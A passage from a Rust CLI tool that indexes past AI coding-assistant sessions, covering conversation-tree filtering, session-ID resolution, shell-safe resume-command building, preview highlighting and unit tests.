    body.is_empty() || body.starts_with("[Tool") || body.starts_with("[Request interrupted")
}

/// Drop nodes failing `keep`, lifting a dropped node's surviving descendants into its place
/// and repointing them at the nearest surviving ancestor.
///
/// Why not drop the whole subtree: a kept reply sitting under a filtered tool result would
/// disappear, and surfacing exactly those replies is the reason the filter exists. Why
/// rewrite `parent_uuid`: left alone it names a node no longer in the tree, so a consumer
/// cannot rebuild the structure.
fn prune_tree(
    nodes: Vec<TreeNode>,
    surviving_parent: Option<&str>,
    keep: &impl Fn(&TreeNode) -> bool,
) -> Vec<TreeNode> {
    let mut out = Vec::new();
    for mut node in nodes {
        let children = std::mem::take(&mut node.children);
        if keep(&node) {
            node.parent_uuid = surviving_parent.map(str::to_string);
            let uuid = node.message_uuid.clone();
            node.children = prune_tree(children, Some(&uuid), keep);
            out.push(node);
        } else {
            out.extend(prune_tree(children, surviving_parent, keep));
        }
    }
    out
}

/// Flatten to a chronological list.
///
/// Sorted by timestamp rather than left as the depth-first walk: a session with more than
/// one tree root -- resumes, sidechains, a parent pruned away -- interleaves its subtrees in
/// time, so depth-first order puts an older message after a newer one. 5,649 sessions in a
/// real index have multiple roots, and `--flat` exists precisely so a caller can take the
/// last N messages and get the most recent ones.
///
/// The sort is stable, so siblings recorded in the same second keep their structural order.
/// `depth` keeps its original value: once flattened it is the only remaining record of where
/// the message sat in the conversation.
fn flatten_tree(nodes: Vec<TreeNode>) -> Vec<TreeNode> {
    fn walk(nodes: Vec<TreeNode>, out: &mut Vec<TreeNode>) {
        for mut node in nodes {
            let children = std::mem::take(&mut node.children);
            out.push(node);
            walk(children, out);
        }
    }
    let mut out = Vec::new();
    walk(nodes, &mut out);
    out.sort_by(|a, b| a.timestamp.cmp(&b.timestamp));
    out
}

/// Drop or truncate every `full_content` in a serialized tree.
///
/// Bodies are opt-in so the default stays small enough for an agent's context window; a
/// long session serializes to hundreds of KB otherwise. `full_content_truncated` is written
/// beside every body that survives, so a consumer never has to handle a body with no flag.
fn apply_tree_content(val: &mut serde_json::Value, opts: &TreeOpts) {
    fn walk(node: &mut serde_json::Value, opts: &TreeOpts) {
        if let Some(map) = node.as_object_mut() {
            match map.get("full_content").and_then(|b| b.as_str()) {
                // Only a present string body can be capped. A missing or non-string one
                // falls through to removal rather than being left as-is: leaving it would
                // produce a node carrying a body with no `full_content_truncated` beside
                // it, the two-shapes-for-one-field problem this function exists to avoid.
                Some(body) if opts.content => {
                    let (text, dropped) = truncate_chars(body, opts.content_chars);
                    map.insert("full_content".to_string(), serde_json::Value::String(text));
                    map.insert(
                        "full_content_truncated".to_string(),
                        serde_json::Value::Bool(dropped),
                    );
                }
                _ => {
                    map.remove("full_content");
                }
            }
            if let Some(children) = map.get_mut("children") {
                walk_all(children, opts);
            }
        }
    }
    fn walk_all(nodes: &mut serde_json::Value, opts: &TreeOpts) {
        if let Some(arr) = nodes.as_array_mut() {
            for node in arr.iter_mut() {
                walk(node, opts);
            }
        }
    }
    if let Some(tree) = val.get_mut("tree") {
        walk_all(tree, opts);
    }
}

/// Display options for `tree`, grouped so `cmd_tree` keeps a readable signature.
struct TreeOpts {
    role: Option<String>,
    no_tools: bool,
    flat: bool,
    content: bool,
    content_chars: usize,
    json: bool,
}

/// Apply `--role` / `--no-tools` / `--flat` and report how many nodes survived.
///
/// Returns the surviving count separately: `total_messages` keeps meaning "messages in the
/// session", so without this a filtered result gives no way to tell an empty answer from a
/// filter that matched nothing.
fn filter_tree(tree: &mut crate::search::ConversationTree, opts: &TreeOpts) -> usize {
    let nodes = std::mem::take(&mut tree.tree);
    let role = opts.role.clone();
    let no_tools = opts.no_tools;
    let kept = if role.is_some() || no_tools {
        prune_tree(nodes, None, &|node: &TreeNode| {
            role.as_deref().is_none_or(|r| node.message_type == r)
                && !(no_tools && is_tool_node(node))
        })
    } else {
        nodes
    };
    let kept = if opts.flat { flatten_tree(kept) } else { kept };

    fn count(nodes: &[TreeNode]) -> usize {
        nodes.iter().map(|n| 1 + count(&n.children)).sum()
    }
    let returned = count(&kept);
    tree.tree = kept;
    returned
}

/// Say so when the filters matched nothing, without losing whatever the tree already warned
/// about.
///
/// Appended rather than assigned: the raw-transcript fallback puts its "run index --all to
/// repair the DB" instruction in this same field, and overwriting it would hide a broken
/// index behind what reads as nothing worse than an over-eager filter.
fn note_empty_filter(tree: &mut crate::search::ConversationTree, returned: usize) {
    if returned > 0 || tree.total_messages == 0 {
        return;
    }
    let note = format!("0 of {} messages matched the filters", tree.total_messages);
    tree.warning = Some(match tree.warning.take() {
        Some(existing) => format!("{} {}", existing, note),
        None => note,
    });
}

fn cmd_tree(session_id: &str, opts: &TreeOpts) -> Result<()> {
    // Below the lookup, not above it: on top, the detached indexer it spawns would race
    // this command's own synchronous write for the same file against a 30s busy_timeout.
    // The lookup already handles the only case that needed fresher data.
    //
    // The error path still has to spawn it. `lookup_tree` fails outright when no database
    // exists yet, and on `main` the spawn above that call is what built one -- without this,
    // `tree` on a fresh install would say "run init" forever while `search` and `list`
    // quietly heal themselves, and SKILL.md now sends agents to `tree` first.
    let mut tree = match lookup_tree(db::DEFAULT_DB_PATH, session_id, None) {
        Ok(tree) => tree,
        Err(e) => {
            maybe_background_index();
            return Err(e);
        }
    };
    maybe_background_index();

    let code = tree_exit_code(&tree);
    let filtered = tree.error.is_none();
    let returned = if filtered {
        let returned = filter_tree(&mut tree, opts);
        note_empty_filter(&mut tree, returned);
        Some(returned)
    } else {
        None
    };

    if opts.json {
        // The JSON body is unchanged, error key and all: the fzf preview and any existing
        // reader of `.error` keep working, and only the exit status becomes honest.
        let json_val = serde_json::to_value(&tree)?;
        let mut localized = localize_timestamps(json_val);
        apply_tree_content(&mut localized, opts);
        if let (Some(returned), Some(map)) = (returned, localized.as_object_mut()) {
            map.insert(
                "returned_messages".to_string(),
                serde_json::Value::from(returned),
            );
        }
        println!("{}", serde_json::to_string_pretty(&localized)?);
    } else {
        println!("Conversation tree: {}\n", session_id);

        if let Some(ref err) = tree.error {
            // stderr, not stdout: `tree ... > out.txt` should leave the failure visible in
            // the terminal rather than buried in the file.
            eprintln!("Error: {}", err);
        } else {
            if let Some(ref warning) = tree.warning {
                eprintln!("Warning: {}", warning);
            }
            if let Some(ref conv) = tree.conversation {
                if let Some(m) = conv.model.as_deref() {
                    println!("Model: {}\n", m);
                }
            }
            print_tree_nodes(&tree.tree, 0, opts);
            if let Some(returned) = returned {
                if returned != tree.total_messages {
                    println!("\n{} of {} messages shown", returned, tree.total_messages);
                }
            }
        }
    }

    if code != 0 {
        // process::exit skips destructors, so flush first or the JSON above is lost when
        // stdout is a pipe.
        use std::io::Write;
        let _ = std::io::stdout().flush();
        std::process::exit(code);
    }

    Ok(())
}

fn print_tree_nodes(nodes: &[TreeNode], indent: usize, opts: &TreeOpts) {
    for node in nodes {
        let icon = if node.message_type == "user" {
            "\u{1f464}"
        } else {
            "\u{1f916}"
        };
        let summary = node.summary.as_deref().unwrap_or("");
        let truncated: String = summary.chars().take(80).collect();
        let prefix = "  ".repeat(indent);
        // Rewound-away branches stay in the index for search but are no longer
        // live: mark them inline so `tree` reads as current-path + history.
        let abandoned = if node.is_abandoned { " [rewound]" } else { "" };
        match node.model.as_deref() {
            Some(m) => println!("{}{} {}{} ({})", prefix, icon, truncated, abandoned, m),
            None => println!("{}{} {}{}", prefix, icon, truncated, abandoned),
        }
        if opts.content {
            let (body, dropped) = truncate_chars(&node.full_content, opts.content_chars);
            for line in body.lines() {
                println!("{}    {}", prefix, line);
            }
            if dropped {
                println!("{}    ...", prefix);
            }
        }
        print_tree_nodes(&node.children, indent + 1, opts);
    }
}

fn cmd_resume(uuid: &str) -> Result<()> {
    let target = resolve_resume_target(uuid)?;
    match target.project_path {
        Some(project_path) => {
            println!("cd -- {}", shell_quote(&project_path));
            println!(
                "{} --resume {}",
                claude_cmd(),
                shell_quote(&target.session_id)
            );
        }
        None => {
            eprintln!("Message not found: {}", uuid);
            std::process::exit(1);
        }
    }

    Ok(())
}

/// A session that can be resumed, resolved from either a message UUID or a session ID.
#[derive(Debug)]
struct ResumeTarget {
    source: String,
    session_id: String,
    project_path: Option<String>,
    model: Option<String>,
}

/// Escape LIKE wildcards for prefix resolution (same rules as `search::escape_like`).
fn escape_resume_like(value: &str) -> String {
    value
        .replace('\\', "\\\\")
        .replace('%', "\\%")
        .replace('_', "\\_")
}

fn fetch_resume_target(
    conn: &rusqlite::Connection,
    session_id: &str,
) -> Result<Option<ResumeTarget>> {
    let mut stmt = conn.prepare(
        "SELECT session_id, source, project_path, model FROM conversations WHERE session_id = ?",
    )?;
    let mut rows = stmt.query([session_id])?;
    if let Some(row) = rows.next()? {
        let sid: String = row.get(0)?;
        let source: Option<String> = row.get(1)?;
        let project_path: Option<String> = row.get(2)?;
        // Tolerant: a stale handle mid-migration may lack the column.
        let model: Option<String> = row.get::<_, Option<String>>(3).unwrap_or(None);
        return Ok(Some(ResumeTarget {
            source: source.unwrap_or_else(|| "claude_code".to_string()),
            session_id: sid,
            project_path,
            model,
        }));
    }
    Ok(None)
}

/// Resolve `input` (message UUID or session ID) to its resume target.
///
/// Resolution order mirrors `tree`: exact session win, then unique prefix
/// (including bare-UUID matching of `oc:`/`codex:` rows), then message UUID
/// for the legacy `resume` path. Ambiguous prefixes and unsafe inputs are
/// hard errors; a stored unsafe path is NOT an error here (it becomes
/// `resume_command: null` + `error` in the spec output instead).
fn resolve_resume_target_with_conn(
    conn: &rusqlite::Connection,
    input: &str,
) -> Result<ResumeTarget> {
    if input.is_empty() {
        return Err(AppError::General("empty session id".to_string()));
    }
    if input.chars().any(|c| c.is_control()) {
        return Err(AppError::General(format!(
            "refusing session id containing control characters: {}",
            input
        )));
    }
    if input.starts_with('-') {
        return Err(AppError::General(format!(
            "refusing session id starting with '-': {}",
            input
        )));
    }

    if let Some(target) = fetch_resume_target(conn, input)? {
        return Ok(target);
    }

    let esc = escape_resume_like(input);
    let like_bare = format!("{}%", esc);
    let like_oc = format!("oc:{}%", esc);
    let like_codex = format!("codex:{}%", esc);
    let mut stmt = conn.prepare(
        "SELECT session_id FROM conversations
         WHERE session_id LIKE ?1 ESCAPE '\\'
            OR session_id LIKE ?2 ESCAPE '\\'
            OR session_id LIKE ?3 ESCAPE '\\'
         ORDER BY session_id
         LIMIT 11",
    )?;
    let candidates: Vec<String> = stmt
        .query_map(rusqlite::params![like_bare, like_oc, like_codex], |row| {
            row.get(0)
        })?
        .collect::<std::result::Result<Vec<String>, _>>()?;
    match candidates.len() {
        0 => {}
        1 => {
            let full = candidates.into_iter().next().unwrap();
            if let Some(target) = fetch_resume_target(conn, &full)? {
                return Ok(target);
            }
            return Err(AppError::General(format!(
                "Conversation {} not found",
                input
            )));
        }
        n => {
            let sample = candidates
                .iter()
                .take(3)
                .map(String::as_str)
                .collect::<Vec<_>>()
                .join(", ");
            return Err(AppError::General(format!(
                "Ambiguous session id '{}' matches {}{} conversations: {}",
                input,
                n,
                if n >= 11 { "+" } else { "" },
                sample
            )));
        }
    }

    let msg: std::result::Result<(String, Option<String>), _> = conn.query_row(
        "SELECT session_id, project_path FROM messages WHERE message_uuid = ?",
        [input],
        |row| Ok((row.get(0)?, row.get(1)?)),
    );
    match msg {
        Ok((session_id, msg_project)) => {
            if let Some(target) = fetch_resume_target(conn, &session_id)? {
                return Ok(target);
            }
            Ok(ResumeTarget {
                source: "claude_code".to_string(),
                session_id,
                project_path: msg_project,
                model: None,
            })
        }
        Err(_) => Err(AppError::General(format!(
            "Conversation {} not found",
            input
        ))),
    }
}

fn resolve_resume_target(input: &str) -> Result<ResumeTarget> {
    let conn = db::connect(db::DEFAULT_DB_PATH, true)?;
    resolve_resume_target_with_conn(&conn, input)
}

/// Split `claude_cmd()` into its real binary.
///
/// The command is a shell fragment, not a filename: `env FOO=1 claude` is
/// legitimate. The leading `env` and its `KEY=value` assignments are skipped.
/// Returns `None` when no binary remains; callers still emit the original
/// `resume_command` string for eval compatibility.
fn parse_resume_binary(cmd: &str) -> Option<String> {
    let mut parts = cmd.split_whitespace();
    let first = parts.next()?;
    if first == "env" {
        for token in parts {
            if token.contains('=') {
                continue;
            }
            return Some(token.to_string());
        }
        return None;
    }
    Some(first.to_string())
}

#[derive(serde::Serialize)]
struct ResumeSpecOutput {
    source: String,
    session_id: String,
    project_path: Option<String>,
    project_exists: Option<bool>,
    project_basename: Option<String>,
    binary: Option<String>,
    args: Vec<String>,
    resume_command: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    model: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    note: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
}

fn build_resume_spec_with_cmd(target: &ResumeTarget, cmd: &str) -> ResumeSpecOutput {
    let project_exists: Option<bool> = target
        .project_path
        .as_ref()
        .map(|p| std::path::Path::new(p).exists());
    let project_basename = project_basename(target.project_path.as_deref());
    if target.source == "opencode" || target.source == "codex" {
        return ResumeSpecOutput {
            source: target.source.clone(),
            session_id: target.session_id.clone(),
            project_path: target.project_path.clone(),
            project_exists,
            project_basename,
            binary: None,
            args: Vec::new(),
            resume_command: None,
            model: target.model.clone(),
            note: Some("resumed with their own tools".to_string()),
            error: None,
        };
    }
    let binary = parse_resume_binary(cmd);
    let args = match binary {
        Some(_) => vec!["--resume".to_string(), target.session_id.clone()],
        None => Vec::new(),
    };
    let error_kind: Option<&str> = match (&target.project_path, &target.session_id) {
        (None, _) => Some("no_project_path"),
        (Some(pp), _) if !is_shell_safe_value(pp) => Some("unsafe_path"),
        (_, sid) if !is_shell_safe_value(sid) || sid.starts_with('-') => Some("unsafe_session_id"),
        _ => None,
    };
    let resume_command = match error_kind {
        Some(_) => None,
        None => {
            let pp = target.project_path.as_deref().unwrap();
            build_resume_command(pp, &target.session_id, cmd)
        }
    };
    // `build_resume_command` re-checks shell safety; a `None` here means the
    // stored values failed that check even though the input did not.
    let error = match (&resume_command, error_kind) {
        (Some(_), _) => None,
        (None, Some(kind)) => Some(kind.to_string()),
        (None, None) => {
            if !is_shell_safe_value(&target.session_id) || target.session_id.starts_with('-') {
                Some("unsafe_session_id".to_string())
            } else {
                Some("unsafe_path".to_string())
            }
        }
    };
    ResumeSpecOutput {
        source: target.source.clone(),
        session_id: target.session_id.clone(),
        project_path: target.project_path.clone(),
        project_exists,
        project_basename,
        binary,
        args,
        resume_command,
        model: target.model.clone(),
        note: None,
        error,
    }
}

fn build_resume_spec(target: &ResumeTarget) -> ResumeSpecOutput {
    build_resume_spec_with_cmd(target, &claude_cmd())
}

fn cmd_resume_spec(session_id: &str, json_output: bool) -> Result<()> {
    let target = resolve_resume_target(session_id)?;
    let spec = build_resume_spec(&target);

    if json_output {
        println!("{}", serde_json::to_string_pretty(&spec)?);
        return Ok(());
    }

    println!("source: {}", spec.source);
    if let Some(m) = spec.model.as_deref() {
        println!("model: {}", m);
    }
    match (&spec.project_path, spec.project_exists) {
        (Some(pp), Some(true)) => println!("project: {} (exists)", pp),
        (Some(pp), Some(false)) => println!("project: {} (missing)", pp),
        _ => println!("project: (unknown)"),
    }
    if spec.binary.is_some() && spec.resume_command.is_some() {
        let binary = spec.binary.as_deref().unwrap();
        let pp = spec.project_path.as_deref().unwrap_or("");
        println!("run: {} --resume {} (in {})", binary, spec.session_id, pp);
    }
    match spec.resume_command {
        Some(cmd) => println!("eval: {}", cmd),
        None => {
            if spec.source == "opencode" {
                println!("OpenCode sessions are resumed with their own tools");
            } else if spec.source == "codex" {
                println!("Codex sessions are resumed with their own tools");
            } else if let Some(err) = spec.error {
                println!("cannot build shell command: {}", err);
            } else {
                println!("cannot build shell command");
            }
        }
    }

    Ok(())
}

/// Whether the preview highlight may emit ANSI.
///
/// Disabled by `--no-color`, by a present `NO_COLOR` env (any value, per
/// https://no-color.org), or when stdout is not a TTY (piped into `head`,
/// fzf's preview pane captures the same way). `--json` never highlights
/// regardless — the caller can check this separately, this is only the TTY
/// half of the decision.
fn preview_color_enabled(no_color: bool) -> bool {
    preview_color_enabled_with(
        no_color,
        std::env::var_os("NO_COLOR").is_some(),
        clicolor_force(),
        std::io::IsTerminal::is_terminal(&std::io::stdout()),
    )
}

/// `CLICOLOR_FORCE=1` (and not `0`) forces color even when piped — the fzf
/// preview pane captures stdout, so without this the grep mode (`preview
/// --query {q}` from `pick`) could never highlight. `NO_COLOR` still wins
/// when both are set.
fn clicolor_force() -> bool {
    match std::env::var("CLICOLOR_FORCE") {
        Ok(v) => v != "0",
        Err(_) => false,
    }
}

fn preview_color_enabled_with(
    no_color_flag: bool,
    no_color_env: bool,
    clicolor_force: bool,
    is_tty: bool,
) -> bool {
    if no_color_flag || no_color_env {
        return false;
    }
    clicolor_force || is_tty
}

/// Normalize the `--query` phrase: trim surrounding whitespace, ignore empty.
///
/// Multi-word input stays one phrase (no AND/OR splitting) — the contract
/// with `pick`'s grep mode (`--query {q}`), where fzf's `{q}` can contain
/// spaces.
fn normalize_preview_query(query: Option<&str>) -> Option<String> {
    query
        .map(str::trim)
        .filter(|q| !q.is_empty())
        .map(str::to_string)
}

/// ASCII-only case-insensitive phrase highlight.
///
/// `to_ascii_lowercase` is length-preserving, and ASCII bytes never appear
/// inside a multibyte UTF-8 sequence, so byte indices found in the lowered
/// copy are always char boundaries in the original — no panic on Japanese
/// text. Non-ASCII case differences are deliberately not folded.
fn highlight_query(line: &str, query: &str) -> String {
    let needle = query.to_ascii_lowercase();
    if needle.is_empty() {
        return line.to_string();
    }
    let hay = line.to_ascii_lowercase();
    let mut out = String::with_capacity(line.len() + 16);
    let mut pos = 0;
    while pos <= hay.len() {
        let Some(rel) = hay[pos..].find(&needle) else {
            out.push_str(&line[pos..]);
            break;
        };
        let start = pos + rel;
        let end = start + needle.len();
        out.push_str(&line[pos..start]);
        out.push_str("\x1b[1;31m");
        out.push_str(&line[start..end]);
        out.push_str("\x1b[0m");
        pos = end;
        if pos >= hay.len() {
            break;
        }
    }
    out
}

/// Whether a message body contains the preview query (pre-truncation full
/// text, ASCII case-insensitive). Used for both the human highlight path
/// and the JSON `matches` list so the two agree.
fn preview_body_matches(full_content: &str, query: Option<&str>) -> bool {
    let Some(q) = normalize_preview_query(query) else {
        return false;
    };
    full_content
        .to_ascii_lowercase()
        .contains(&q.to_ascii_lowercase())
}

/// Short `YYYY-MM-DD HH:MM` for the preview `Range:` header.
///
/// Timestamps are RFC3339 (localized by the time they reach JSON); if parsing
/// fails the raw value is truncated to 16 chars like the `pick` preview does.
fn short_preview_time(ts: &str) -> String {
    let cleaned = ts.replace('Z', "+00:00");
    if let Ok(dt) = chrono::DateTime::parse_from_rfc3339(&cleaned) {
        let local: chrono::DateTime<chrono::Local> = dt.with_timezone(&chrono::Local);
        return local.format("%Y-%m-%d %H:%M").to_string();
    }
    ts.chars().take(16).collect()
}

#[allow(clippy::too_many_arguments)]
fn cmd_preview(
    session_id: &str,
    query: Option<&str>,
    messages: usize,
    json_output: bool,
    no_color: bool,
    content_chars: usize,
) -> Result<()> {
    // Canonicalize first so bare prefixes (`e16efca0`) and `oc:`/`codex:`
    // inputs resolve exactly like `resume-spec`. Ambiguous/unsafe inputs
    // are hard errors here, matching `tree`'s wording via the shared helper.
    // In `--json` mode an unresolvable id still prints the `tree`-shaped
    // error envelope (`.error` key) so JSON readers need no second shape —
    // only the exit status tells success from failure.
    let target = match resolve_resume_target(session_id) {
        Ok(target) => target,
        Err(e) => {
            if json_output {
                if let Ok(tree) = lookup_tree(db::DEFAULT_DB_PATH, session_id, None) {
                    let json_val = serde_json::to_value(&tree)?;
                    let mut localized = localize_timestamps(json_val);
                    if let Some(map) = localized.as_object_mut() {
                        map.insert("returned_messages".to_string(), serde_json::Value::from(0));
                        map.insert(
                            "query".to_string(),
                            match normalize_preview_query(query) {
                                Some(q) => serde_json::Value::String(q),
                                None => serde_json::Value::Null,
                            },
                        );
                        map.insert("matches".to_string(), serde_json::Value::Array(Vec::new()));
                        map.insert("project_exists".to_string(), serde_json::Value::Null);
                        map.insert("project_basename".to_string(), serde_json::Value::Null);
                    }
                    println!("{}", serde_json::to_string_pretty(&localized)?);
                }
                use std::io::Write;
                let _ = std::io::stdout().flush();
                eprintln!("Error: {}", e);
                std::process::exit(1);
            }
            return Err(e);
        }
    };
    let project_exists: Option<bool> = target
        .project_path
        .as_ref()
        .map(|p| std::path::Path::new(p).exists());

    let mut tree = match lookup_tree(db::DEFAULT_DB_PATH, &target.session_id, None) {
        Ok(tree) => tree,
        Err(e) => {
            maybe_background_index();
            return Err(e);
        }
    };
    maybe_background_index();

    let code = tree_exit_code(&tree);
    if tree.error.is_none() {
        let opts = TreeOpts {
            role: None,
            no_tools: true,
            flat: true,
            content: true,
            content_chars,
            json: json_output,
        };
        filter_tree(&mut tree, &opts);
        // `flatten_tree` inside `filter_tree` already sorted chronologically,
        // so the tail is the most recent N. Prefer the live path: rewound-away
        // branches stay searchable via `search`/`tree` but would otherwise
        // pollute the "current state" preview tail.
        let abandoned_in_preview = tree.tree.iter().filter(|n| n.is_abandoned).count();
        if abandoned_in_preview > 0 {
            tree.tree.retain(|n| !n.is_abandoned);
            tree.warning = Some(match tree.warning.take() {
                Some(w) => format!(
                    "{} Preview shows the current path only ({} rewound message(s) hidden; see tree).",
                    w, abandoned_in_preview
                ),
                None => format!(
                    "Preview shows the current path only ({} rewound message(s) hidden; see tree).",
                    abandoned_in_preview
                ),
            });
        }
        if tree.tree.len() > messages {
            let at = tree.tree.len() - messages;
            tree.tree = tree.tree.split_off(at);
        }
    }
    let returned = tree.tree.len();
    let total = tree.total_messages;

    if json_output {
        let query_norm = normalize_preview_query(query);
        let matches: Vec<String> = tree
            .tree
            .iter()
            .filter(|n| preview_body_matches(&n.full_content, query))
            .map(|n| n.message_uuid.clone())
            .collect();
        let json_val = serde_json::to_value(&tree)?;
        let mut localized = localize_timestamps(json_val);
        apply_tree_content(
            &mut localized,
            &TreeOpts {
                role: None,
                no_tools: true,
                flat: true,
                content: true,
                content_chars,
                json: true,
            },
        );
        if let Some(map) = localized.as_object_mut() {
            map.insert(
                "returned_messages".to_string(),
                serde_json::Value::from(returned),
            );
            map.insert(
                "query".to_string(),
                match query_norm {
                    Some(q) => serde_json::Value::String(q),
                    None => serde_json::Value::Null,
                },
            );
            map.insert(
                "matches".to_string(),
                serde_json::Value::Array(
                    matches.into_iter().map(serde_json::Value::String).collect(),
                ),
            );
            map.insert(
                "project_exists".to_string(),
                match project_exists {
                    Some(b) => serde_json::Value::Bool(b),
                    None => serde_json::Value::Null,
                },
            );
            map.insert(
                "project_basename".to_string(),
                match project_basename(target.project_path.as_deref()) {
                    Some(b) => serde_json::Value::String(b),
                    None => serde_json::Value::Null,
                },
            );
        }
        println!("{}", serde_json::to_string_pretty(&localized)?);
    } else {
        // Human path mirrors `cmd_tree`'s error contract: stderr + exit code,
        // never stdout, so `preview ... > out.txt` keeps the failure visible.
        if let Some(ref err) = tree.error {
            eprintln!("Error: {}", err);
        } else {
            if let Some(ref warning) = tree.warning {
                eprintln!("Warning: {}", warning);
            }
            let project = target.project_path.as_deref().unwrap_or("(unknown)");
            let (start, end) = if returned == 0 {
                (0, 0)
            } else {
                (total.saturating_sub(returned) + 1, total)
            };
            println!(
                "Project: {}{}",
                project,
                missing_marker(target.project_path.as_deref())
            );
            if let Some(m) = tree.conversation.as_ref().and_then(|c| c.model.as_deref()) {
                println!("Model: {}", m);
            }
            println!("Messages: {}-{}/{} (returned/total)", start, end, total);
            let range = if returned == 0 {
                "(empty)".to_string()
            } else {
                format!(
                    "{} → {}",
                    short_preview_time(&tree.tree.first().unwrap().timestamp),
                    short_preview_time(&tree.tree.last().unwrap().timestamp)
                )
            };
            println!("Range: {}", range);
            println!();
            let color = preview_color_enabled(no_color);
            let query_norm = normalize_preview_query(query);
            for node in &tree.tree {
                let icon = if node.message_type == "user" {
                    "\u{1f464}"
                } else {
                    "\u{1f916}"
                };
                println!("{} {}", icon, node.summary.as_deref().unwrap_or(""));
                let (body, dropped) = truncate_chars(&node.full_content, content_chars);
                for line in body.lines() {
                    let rendered = match &query_norm {
                        Some(q) if color => highlight_query(line, q),
                        _ => line.to_string(),
                    };
                    println!("    {}", rendered);
                }
                if dropped {
                    println!("    ...");
                }
            }
        }
    }

    if code != 0 {
        use std::io::Write;
        let _ = std::io::stdout().flush();
        std::process::exit(code);
    }

    Ok(())
}

fn cmd_hook() -> Result<()> {
    // Own TTL, not the shared one -- see `hook_index_ttl_secs` for why.
    let ttl = hook_index_ttl_secs(std::env::var("CONVERSATION_SEARCH_HOOK_TTL").ok());
    let _ = try_background_index(Some(ttl));
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_last_background_failures_reads_only_the_latest_run() {
        let log = format!(
            "{h} 2026-10-07 10:00:00 v0.18.0 (incremental)\n\
             Error: Database error: no such function: bigram_analyze\n\
             {h} 2026-10-07 10:05:00 v0.19.0 (incremental)\n\
             Warning: OBSERVER flag unrecognised\n\
             \nError indexing /a.jsonl: disk full\n\
             Warning: failed to index Codex CLI conversations: locked\n\
             thread 'main' panicked at src/indexer/claude_code.rs:1:1:\n",
            h = BACKGROUND_LOG_HEADER
        );
        let (run, failures) = last_background_failures(&log).unwrap();
        assert!(run.contains("v0.19.0"), "{}", run);
        assert_eq!(
            failures,
            vec![
                "Error indexing /a.jsonl: disk full",
                "Warning: failed to index Codex CLI conversations: locked",
                "thread 'main' panicked at src/indexer/claude_code.rs:1:1:",
            ]
        );
        let clean = format!(
            "{} 2026-10-07 10:05:00 v0.19.0 (full)\n",
            BACKGROUND_LOG_HEADER
        );
        assert!(last_background_failures(&clean).is_none());
        assert!(last_background_failures("").is_none());
    }

    fn unique_stamp_path(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("conv-search-{}-{}", name, std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        dir.join(".last-auto-index")
    }

    #[test]
    fn test_display_summary_treats_blank_as_missing() {
        assert_eq!(display_summary(None), "[no summary]");
        assert_eq!(display_summary(Some("")), "[no summary]");
        // Whitespace-only would otherwise print as a blank line, which reads as a
        // rendering bug rather than a missing title.
        assert_eq!(display_summary(Some("   ")), "[no summary]");
        assert_eq!(display_summary(Some("\n\t ")), "[no summary]");
    }

    #[test]
    fn test_display_summary_keeps_real_values() {
        assert_eq!(display_summary(Some("Auth Bug Fix")), "Auth Bug Fix");
        // Not trimmed for display -- only tested for emptiness.
        assert_eq!(display_summary(Some(" padded ")), " padded ");
    }

    #[test]
    fn test_display_summary_collapses_to_first_line() {
        // Row layout is one line with a suffix after the summary; a newline would push
        // that suffix onto its own line.
        assert_eq!(
            display_summary(Some("<command-message>daily-report</command-message>\n<command-name>/daily-report</command-name>")),
            "<command-message>daily-report</command-message>"
        );
    }

    #[test]
    fn test_display_summary_skips_leading_blank_lines() {
        assert_eq!(
            display_summary(Some("\n\n  \nReal Title\nmore")),
            "Real Title"
        );
    }

    /// A `ConversationSearch` over an in-memory DB holding one message.
    fn search_with_message(uuid: &str, body: &str) -> ConversationSearch {
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        conn.execute_batch("PRAGMA foreign_keys = OFF;").unwrap();
        conn.execute_batch(include_str!("../data/schema.sql"))
            .unwrap();
        conn.execute(
            "INSERT INTO messages (message_uuid, session_id, depth, timestamp, message_type, project_path, full_content)
             VALUES (?, 'sess1', 0, '2025-01-15T10:00:00', 'user', '/proj', ?)",
            rusqlite::params![uuid, body],
        )
        .unwrap();
        ConversationSearch::from_connection(conn)
    }

    #[test]
    fn test_inject_full_content_attaches_body_and_truncation_flag() {
        let search = search_with_message("m1", "abcdefghij");
        let mut rows = serde_json::json!([{"message_uuid": "m1", "session_id": "sess1"}]);

        inject_full_content(&mut rows, &search, 5);

        assert_eq!(rows[0]["full_content"], "abcde");
        assert_eq!(rows[0]["full_content_truncated"], true);
    }

    #[test]
    fn test_inject_full_content_flags_untruncated_body() {
        let search = search_with_message("m1", "short");
        let mut rows = serde_json::json!([{"message_uuid": "m1"}]);

        inject_full_content(&mut rows, &search, 300);

        assert_eq!(rows[0]["full_content"], "short");
        assert_eq!(rows[0]["full_content_truncated"], false);
    }

    /// The grouped shape must work through the real serializer, not a hand-written JSON
    /// literal: the lookup depends on `GroupedRow` flattening its representative, and only
    /// serializing an actual `GroupedRow` proves that still holds.
    #[test]
    fn test_inject_full_content_handles_serialized_grouped_row() {
        let search = search_with_message("m1", "grouped body");
        let row = crate::search::GroupedRow {
            representative: crate::search::SearchResultRow {
                rowid: 1,
                message_uuid: "m1".to_string(),
                session_id: "sess1".to_string(),
                parent_uuid: None,
                timestamp: "2025-01-15T10:00:00".to_string(),
                message_type: "user".to_string(),
                project_path: Some("/proj".to_string()),
                depth: 0,
                is_sidechain: false,
                context_snippet: "snippet".to_string(),
                conversation_summary: None,
                conversation_file: None,
                source: Some("claude_code".to_string()),
                model: None,
                conversation_model: None,
                is_abandoned: false,
            },
            match_count: 3,
        };
        let mut rows = serde_json::to_value(vec![row]).unwrap();

        inject_full_content(&mut rows, &search, 300);

        assert_eq!(rows[0]["match_count"], 3, "flattened shape assumption");
        assert_eq!(rows[0]["full_content"], "grouped body");
    }

    #[test]
    fn test_inject_full_content_leaves_rows_without_a_body_alone() {
        // No such message: the row must not gain a half-populated pair of keys.
        let search = search_with_message("m1", "body");
        let mut rows = serde_json::json!([{"message_uuid": "absent"}]);

        inject_full_content(&mut rows, &search, 300);

        assert!(rows[0].get("full_content").is_none());
        assert!(rows[0].get("full_content_truncated").is_none());
    }

    #[test]
    fn test_inject_full_content_ignores_non_array() {
        let search = search_with_message("m1", "body");
        let mut not_an_array = serde_json::json!({"message_uuid": "m1"});

